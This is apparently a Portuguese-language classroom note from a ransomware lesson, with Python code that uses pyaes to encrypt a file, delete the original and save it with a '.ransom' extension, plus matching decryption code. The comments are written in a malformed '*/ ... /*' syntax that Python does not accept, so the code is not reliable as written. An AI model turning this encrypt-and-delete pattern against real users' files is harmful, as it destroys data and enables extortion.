                    ##Criando um encripitador e descriptador##


         ##Criando o decripitador baseado na senha do encripitador acima

import os */Biblioteca com funçoes que interagem com o sitema operacional/*
import pyaes */biliblioteca python para criptografia de arquivos que usa o algoritmo AES/*

## abrir o arquivo a ser criptografado
file_name = "teste.txt"  */nome do arquivo esta entre aspas duplas, esta sendo armazenado na variavel file_name/*
file = open(file_name, "rb")   */comando rb le o arquivo designado pela variavel /*
file_data = file.read()   */esta sendo feito a leito e armazenado na variavel file_data/*
file.close()  */fecha o arquivo/*

## remover o arquivo
os.remove(file_name) */remove o arquivo file_name/*

## chave de criptografia
key = b"aula_ransomwares" */chave da criptografia/*
aes = pyaes.AESModeOfOperationCTR(key)  */tipo de chave/*

## criptografar o arquivo
crypto_data = aes.encrypt(file_data) */encripta o arquivo file_data/*

## salvar o arquivo criptografado
new_file = file_name + ".ransom" */ salvando o arquivo com extensao .ransom/*
new_file = open(f'{new_file}','wb') */comando wb grava o arquivo destinado pela variavel/*
new_file.write(crypto_data) */gravado  as informaçoes no arquivo criptografado/*
new_file.close() */fechando o arquivo/*


           ##Criando o descriptador baseado na senha do encripitador acima##

import os */Biblioteca com funçoes que interagem com o sitema operacional/*
import pyaes */biliblioteca python para criptografia de arquivos que usa o algoritmo AES/*

## abrir o arquivo criptografado 
file_name = "teste.txt.ransom"  */nome do arquivo esta entre aspas duplas, esta sendo armazenado na variavel file_name/*
file = open(file_name, "rb")   */comando rb le o arquivo designado pela variavel /*
file_data = file.read()   */esta sendo feito a leito e armazenado na variavel file_data/*
file.close()  */fecha o arquivo/*

## chave para descriptografia
key = b"aula_ransomwares" */chave da descriptografia/*
aes = pyaes.AESModeOfOperationCTR(key)  */tipo de chave/*
decrypt_data = aes.decrypt(file_data) */decripta o arquivo file_data/*

## remover o arquivo criptografado
os.remove(file_name) */remove o arquivo file_name/*

## criar o arquivo descriptografado
new_file = "teste.txt" */criando no arquivo/*
new_file = open(f'{new_file}', "wb")  */comando wb grava o arquivo destinado pela variavel/*
new_file.write(decrypt_data) */gravado  as informaçoes no arquivo ja descriptografado/*
new_file.close() */fechando o arquivo/*
